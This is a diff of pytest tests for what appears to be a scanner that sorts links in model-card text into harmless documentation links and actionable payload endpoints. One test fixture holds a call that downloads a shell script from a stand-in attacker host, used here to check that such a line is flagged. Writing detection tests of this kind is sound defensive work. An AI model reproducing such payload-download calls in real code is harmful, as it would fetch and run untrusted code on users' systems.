@@ -3927,6 +3927,22 @@ def test_text_scanner_documentation_links_after_prose_or_closed_examples_are_inf
     _assert_model_card_endpoint_informational(tmp_path, prefix + "[guide](https://docs.example.com/reference)\n")
 
 
+@pytest.mark.parametrize("contraction", ["It's", "Don't", "We're", "You've", "They'll", "I'd", "I'm", "Can't"])
+def test_text_scanner_contractions_before_parenthetical_links_are_informational(
+    tmp_path: Path, contraction: str
+) -> None:
+    _assert_model_card_endpoint_informational(
+        tmp_path, f"{contraction} (see [guide](https://docs.example.com/reference))\n"
+    )
+
+
+@pytest.mark.parametrize("contraction", ["It's", "Don't", "We're", "You've", "They'll", "I'd", "I'm", "Can't"])
+def test_text_scanner_contractions_inside_enclosing_calls_remain_actionable(tmp_path: Path, contraction: str) -> None:
+    _assert_model_card_payload_endpoint_actionable(
+        tmp_path, f'download("{contraction} (see [payload](https://evil.example/payload.sh))")\n'
+    )
+
+
 @pytest.mark.parametrize("tag,attribute", [("img", "src"), ("a", "href")])
 def test_text_scanner_multiline_documentation_html_links_are_informational(
     tmp_path: Path, tag: str, attribute: str
